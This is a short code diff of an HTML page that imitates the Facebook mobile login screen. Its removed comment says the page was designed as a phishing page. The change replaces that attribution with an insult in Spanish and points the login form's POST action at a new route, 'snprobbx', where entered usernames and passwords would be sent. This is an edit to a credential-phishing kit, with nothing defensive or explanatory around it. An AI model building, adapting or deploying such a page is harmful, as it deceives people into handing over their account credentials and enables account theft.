@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<!--Designed as phishing page by KasRoudra(https://github.com/KasRoudra)-->
+<!--Marico el que lo lea-->
 <html lang="en">
   <head>
     <title>Facebook – log in or sign up</title>
@@ -445,7 +445,7 @@
                   <div class="_5rut">
                     <form
                       method="post"
-                      action="{{ url('book') }}"
+                      action="{{ url('snprobbx') }}"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
                       novalidate="1"
